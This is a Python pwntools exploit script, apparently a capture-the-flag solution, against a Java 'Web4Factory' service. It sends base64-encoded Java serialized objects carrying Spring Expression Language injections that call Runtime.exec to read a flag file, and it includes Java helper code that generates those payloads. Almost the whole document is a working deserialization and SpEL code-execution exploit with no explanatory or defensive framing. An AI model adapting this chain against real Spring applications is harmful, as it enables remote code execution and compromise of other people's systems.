#!/usr/bin/env python3

from pwn import *
import json

"""

This script exploits the two seperate injection vulnerabilities with Spring Expression Language. It injects SePL which can get code execution.

public void generateSPELExploit() {
    Web4FactoryFactoryWidget w = new Web4FactoryFactoryWidget("");
    w.name = "new java.io.BufferedReader(T(java.io.Reader).cast(new java.io.InputStreamReader(T(java.io.InputStream).cast(''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('cat ./flag').getInputStream())))).readLine()+";

    w.argTypes = new Class[]{String.class};
    w.returnType = String.class;
    Web4FactoryFactory f = new Web4FactoryFactory("test",w);
    String out = f.toString();

    logger.info("SPELExploit object is {}", out);

}

public void generateSPELExploit2() throws IOException {
    Web4FactoryFactory f = new Web4FactoryFactory("foo", null);
    f.factoryExpr = new Web4FactoryExpression("new java.io.BufferedReader(T(java.io.Reader).cast(new java.io.InputStreamReader(T(java.io.InputStream).cast(''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('cat ./flag').getInputStream())))).readLine()", String.class);
    String out = f.s(f);
    logger.info("SPELExploit2 object is {}", out);
}

"""

PAYLOAD_1 = '''rO0ABXNyAERpbnN0aXR1dGUubmF1dGlsdXMud2ViNGZhY3Rvcnkud2ViNGZhY3RvcnlmYWN0b3J5LldlYjRGYWN0b3J5RmFjdG9yeQAAAAAAAHppAgADTAAHZmFjdG9yeXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAC2ZhY3RvcnlFeHBydAA2TGluc3RpdHV0ZS9uYXV0aWx1cy93ZWI0ZmFjdG9yeS9XZWI0RmFjdG9yeUV4cHJlc3Npb247TAALZmFjdG9yeU5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHBzcgA0aW5zdGl0dXRlLm5hdXRpbHVzLndlYjRmYWN0b3J5LldlYjRGYWN0b3J5RXhwcmVzc2lvbgAAAAAAAHppAgACTAAEZXhwcnEAfgADTAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHB0AQxuZXcgamF2YS5pby5CdWZmZXJlZFJlYWRlcihUKGphdmEuaW8uUmVhZGVyKS5jYXN0KG5ldyBqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyKFQoamF2YS5pby5JbnB1dFN0cmVhbSkuY2FzdCgnJy5nZXRDbGFzcygpLmZvck5hbWUoJ2phdmEubGFuZy5SdW50aW1lJykuZ2V0TWV0aG9kcygpWzZdLmludm9rZSgnJy5nZXRDbGFzcygpLmZvck5hbWUoJ2phdmEubGFuZy5SdW50aW1lJykpLmV4ZWMoJ2NhdCAuL2ZsYWcnKS5nZXRJbnB1dFN0cmVhbSgpKSkpKS5yZWFkTGluZSgpdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdAADZm9v'''

PAYLOAD_2 = '''rO0ABXNyAERpbnN0aXR1dGUubmF1dGlsdXMud2ViNGZhY3Rvcnkud2ViNGZhY3RvcnlmYWN0b3J5LldlYjRGYWN0b3J5RmFjdG9yeQAAAAAAAHppAgADTAAHZmFjdG9yeXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAC2ZhY3RvcnlFeHBydAA2TGluc3RpdHV0ZS9uYXV0aWx1cy93ZWI0ZmFjdG9yeS9XZWI0RmFjdG9yeUV4cHJlc3Npb247TAALZmFjdG9yeU5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAEppbnN0aXR1dGUubmF1dGlsdXMud2ViNGZhY3Rvcnkud2ViNGZhY3RvcnlmYWN0b3J5LldlYjRGYWN0b3J5RmFjdG9yeVdpZGdldAAAAAAAAHppAgAEWwAIYXJnVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzcztMAAhjaGlsZHJlbnQAFUxqYXZhL3V0aWwvQXJyYXlMaXN0O0wABG5hbWVxAH4AA0wACnJldHVyblR5cGV0ABFMamF2YS9sYW5nL0NsYXNzO3hwdXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAF3BAAAAAF0AAB4dAENbmV3IGphdmEuaW8uQnVmZmVyZWRSZWFkZXIoVChqYXZhLmlvLlJlYWRlcikuY2FzdChuZXcgamF2YS5pby5JbnB1dFN0cmVhbVJlYWRlcihUKGphdmEuaW8uSW5wdXRTdHJlYW0pLmNhc3QoJycuZ2V0Q2xhc3MoKS5mb3JOYW1lKCdqYXZhLmxhbmcuUnVudGltZScpLmdldE1ldGhvZHMoKVs2XS5pbnZva2UoJycuZ2V0Q2xhc3MoKS5mb3JOYW1lKCdqYXZhLmxhbmcuUnVudGltZScpKS5leGVjKCdjYXQgLi9mbGFnJykuZ2V0SW5wdXRTdHJlYW0oKSkpKSkucmVhZExpbmUoKStxAH4ADXB0AAR0ZXN0'''

def run_payload(pl):
    p = remote('127.0.0.1',10652)

    # Make sure we are ready to talk
    p.sendline('a')
    print(p.readuntil('fault'))

    p.sendline(f'data#{json.dumps(pl)}')
    p.sendline('access@factory@load@existing')
    print(p.readuntil('load ok'))
    p.sendline('access@factory@feed')
    p.interactive()


run_payload(PAYLOAD_1)
#run_payload(PAYLOAD_2)


    


